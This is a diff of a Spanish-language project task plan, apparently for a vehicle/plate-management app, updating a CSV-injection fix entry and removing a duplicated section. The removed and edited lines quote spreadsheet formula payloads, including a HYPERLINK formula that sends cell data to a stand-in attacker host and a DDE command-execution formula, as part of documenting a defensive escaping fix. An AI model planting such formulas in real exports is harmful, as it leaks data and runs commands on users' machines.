@@ -4,7 +4,7 @@
 
 > ### 📍 Estado actual (2026-10-21, cierre de la sesión)
 >
-> El plan está **ejecutado**: **444 de 445 criterios** verificados. `main` y `origin/main` están **sincronizados** (el nº de commits crece con cada entrega; se consulta con `git log --oneline | wc -l`).
+> El plan está **ejecutado**: **437 de 438 criterios** verificados. `main` y `origin/main` están **sincronizados** (el nº de commits crece con cada entrega; se consulta con `git log --oneline | wc -l`).
 >
 > | Comprobación | Resultado |
 > |---|---|
@@ -1520,7 +1520,7 @@ Las dos herramientas quitan la query string antes de comparar (`/alerts?type=x` 
   - [x] Medido: `VehicleCreate.plate` solo exige 4-16 caracteres y el filtro de `plates.py` no se usa en el alta manual.
   - [x] El escapado se aplica a todas las celdas (los 5 informes + el CSV histórico de márgenes).
   - [x] Los números no se escapan: un importe negativo sale `-12.50`.
-  - [x] Test de integración: un vehículo con la matrícula `=cmd|'/c calc'!A0` → el CSV sale con el apóstrofo delante y **ninguna** celda empieza por `=`, `+` o `@`.
+  - [x] Test de integración: un vehículo con la matrícula `=1+1` → el CSV sale con el apóstrofo delante y **ninguna** celda empieza por `=`, `+` o `@`. La primera versión usaba una matrícula de 20 caracteres y **lo cazó el job `integration` (PostgreSQL)**: la columna `vehicles.plate` es `VARCHAR(16)` y en SQLite la longitud no se respeta (el test pasaba en SQLite y fallaba en PostgreSQL).
   - [x] Test unitario parametrizado de los prefijos de fórmula y de los valores normales.
   - [x] **Probado que el test detecta el defecto** reintroduciéndolo (sin el escapado, el test falla).
   - [x] `ruff` y `mypy` en verde.
@@ -1542,24 +1542,6 @@ Las dos herramientas quitan la query string antes de comparar (`/alerts?type=x` 
   - [x] El backup de los adjuntos se verifica al crearlo (se descifra y se lista el tar, como el dump).
   - [x] Los scripts conservan el bit de ejecución `100755` (si no, el cron no haría backups).
   - [x] `simulacro.sh` pasa entero (volcado, cifrado, restauración, esquema y arranque de la app).
-
-### T-77 · P1 (seguridad) — los informes CSV no neutralizaban las fórmulas (CSV injection)
-
-- **Estado**: **completado** — el escapado se aplica en el punto de salida
-- **Contexto**: los informes CSV (`/admin/reports/{informe}.csv` y el histórico `/margins.csv`) se escribían con `csv.writer` **tal cual**, y meten **datos que pone un usuario**:
-  - la **matrícula** de un vehículo: el alta manual **no valida el formato** (`VehicleCreate.plate` solo exige 4-16 caracteres; el filtro de `plates.py` solo se usa en el pipeline del OCR, T-52), así que un conductor puede guardar cualquier texto;
-  - el **nombre de la sucursal**, que pone un admin.
-- **El vector**: una celda que empieza por `=`, `+`, `-`, `@`, tab o CR la interpretan Excel y LibreOffice como una **fórmula**, y se ejecuta al abrir el fichero: `=HYPERLINK("http://atacante/?d="&A1,"clic")` filtra datos de la hoja y `=cmd|'/c calc'!A0` ejecuta un comando en Windows. Es el **CSV injection** clásico.
-- **El arreglo**: `escapar_celda_csv` (el patrón de OWASP: anteponer un apóstrofo, que es lo que hacen las hojas de cálculo para marcar "esto es texto") aplicado en el **punto de salida**, o sea a **todas** las celdas de los cinco informes y del CSV histórico de márgenes. Así se protegen todos los campos, no solo la matrícula.
-  - **Salvedad deliberada**: los **números no se escapan**. Un importe negativo (`-12.50`) empieza por `-` pero **no es una fórmula** (una hoja de cálculo lo lee como número): escaparlo ensuciaría todos los informes de márgenes con pérdidas (`'-12.50`).
-- **Criterios de aceptación**:
-  - [x] Medido: `VehicleCreate.plate` solo exige 4-16 caracteres y el filtro de `plates.py` no se usa en el alta manual.
-  - [x] El escapado se aplica a todas las celdas (los 5 informes + el CSV histórico de márgenes).
-  - [x] Los números no se escapan: un importe negativo sale `-12.50`.
-  - [x] Test de integración: un vehículo con la matrícula `=cmd|'/c calc'!A0` → el CSV sale con el apóstrofo delante y **ninguna** celda empieza por `=`, `+` o `@`.
-  - [x] Test unitario parametrizado de los prefijos de fórmula y de los valores normales.
-  - [x] **Probado que el test detecta el defecto** reintroduciéndolo (sin el escapado, el test falla).
-  - [x] `ruff` y `mypy` en verde.
 
 ### T-14 · I3 — OCR con GPU
 
